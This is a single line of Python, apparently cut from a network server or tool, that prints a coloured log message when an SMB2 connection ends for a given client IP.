				print(color("[+] SMB2: Connection ended for %s" % getattr(self, 'client_ip', 'unknown'), 3))
